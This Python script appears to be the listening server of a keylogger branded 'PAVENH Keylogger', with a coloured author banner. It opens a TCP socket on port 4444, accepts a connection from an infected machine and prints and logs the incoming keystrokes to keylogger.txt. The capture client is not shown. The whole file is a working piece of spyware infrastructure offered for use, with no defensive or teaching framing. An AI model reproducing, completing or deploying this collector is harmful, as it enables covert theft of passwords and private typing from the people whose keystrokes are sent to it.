import socket
import os
import sys
from colorama import Fore, Style
import curses

# def resize_window(stdscr):
#     curses.resize_term(25, 80)

#     curses.curs_set(0)

#     stdscr.clear()
#     stdscr.addstr(0,0, "Terminal size is fixed to 25 x 80. Resizing is disable")

#     stdscr.getch()

# curses.wrapper(resize_window)

def banner():
    
    banner = f"""

    {Fore.LIGHTRED_EX}            ██████╗  █████╗ ██╗   ██╗███████╗███╗   ██╗██╗  ██╗
    {Fore.LIGHTRED_EX}            ██╔══██╗██╔══██╗██║   ██║██╔════╝████╗  ██║██║  ██║
    {Fore.LIGHTRED_EX}            ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║███████║
    {Fore.LIGHTRED_EX}            ██╔═══╝ ██╔══██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██╔══██║
    {Fore.LIGHTRED_EX}            ██║     ██║  ██║ ╚████╔╝ ███████╗██║ ╚████║██║  ██║
    {Fore.LIGHTRED_EX}            ╚═╝     ╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝
    
    {Fore.LIGHTBLACK_EX}                    P A V E N H ___ K E Y L O G G E R
    {Fore.LIGHTBLACK_EX}==============================================================================
    {Fore.GREEN}🔥 Author:  {Fore.LIGHTRED_EX}Yaro Godwin       {Fore.GREEN}🌍 GitHub:  {Fore.LIGHTRED_EX}https://github.com/webgod1   
    {Fore.GREEN}🛠  Version: {Fore.LIGHTRED_EX}1.0               
    {Fore.LIGHTBLACK_EX}==============================================================================
    {Style.RESET_ALL}

    """

    print(banner)

def os_clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    if sys.platform.startswith('win'):
        os.system('title Keylogger by Godwin')
    elif sys.platform.startswith('linux') or sys.platform.startswith('mac'):
        sys.stdout.write(f"\033]0;Keylogger - by Godwin\007")
        sys.stdout.flush()
        sys.stdout.flush()

#Deal with the connections
port = 4444
SERVER = '0.0.0.0'
address = (SERVER, port)
file = open('keylogger.txt', 'a')
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.bind(address)

sock.listen(5)

os_clear()
banner()
print("")
print(Fore.LIGHTRED_EX + "[*] Listening for Connection ...")

client_socket, client_addr = sock.accept()

print(Fore.LIGHTRED_EX + f"[*] Connection esterblish on {client_addr} \n")

print(Fore.LIGHTRED_EX + "A well documented Keystrokes have been save to keylogger.txt")

while True:
    try:
        data = client_socket.recv(1024).decode()
        if not data:
            break
        print("")
        print(Fore.WHITE + " " + data, end="")
        file.write(data)
        file.flush
    except Exception as e:
        print(f"{e}")
